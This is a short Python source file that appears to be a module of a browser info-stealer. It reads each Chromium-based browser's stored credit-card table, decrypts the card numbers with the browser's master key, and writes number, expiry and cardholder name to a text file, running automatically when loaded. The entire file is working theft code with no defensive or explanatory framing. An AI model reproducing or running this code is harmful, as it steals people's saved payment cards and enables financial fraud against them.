
# Import modules
from  __init__ import GetMasterKey, FetchDataBase, DecryptValue, GetBrowsers

""" Fetch credit cards from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Web Data", "SELECT * FROM credit_cards")
        i = 0
        for row in database:
            if not row[4]:
                break
            card = {
                "number": DecryptValue(row[4], master_key),
                "expireYear": row[3],
                "expireMonth": row[2],
                "name": row[1],
            }
            credentials.append(card)
            with open("output_file_card.txt", "a") as file:
                scrittura= str(i) + f") {str(card)}"
                file.write(scrittura)
                file.write("\n")
            i=i+1

    return credentials

Get()